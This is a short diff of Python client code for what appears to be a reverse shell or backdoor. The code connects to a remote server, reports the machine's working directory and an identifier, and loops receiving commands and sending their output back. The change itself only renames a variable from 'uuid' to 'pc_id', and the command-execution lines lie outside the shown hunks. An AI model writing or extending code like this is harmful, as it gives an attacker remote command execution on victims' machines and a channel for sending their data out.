@@ -23,9 +23,9 @@ sock.connect((SERVER_HOST, SERVER_PORT))
 # get the current directory
 current_dir = os.getcwd()
 # get the Unique User Identifier
-uuid = get_id()
+pc_id = get_id()
 
-message = f'{current_dir}{SEPARATOR}{uuid}'
+message = f'{current_dir}{SEPARATOR}{pc_id}'
 sock.send(message.encode(encoding='utf-8'))
 while True:
     # receive the command from the server
@@ -58,10 +58,10 @@ while True:
     # get the current working directory as output
     current_dir = os.getcwd()
     # get the Unique User Identifier
-    uuid = get_id()
+    pc_id = get_id()
 
     # send the results back to the server
-    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{uuid}'
+    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{pc_id}'
     sock.send(message.encode(encoding='utf-8'))
 
 sock.close()  # close client connection
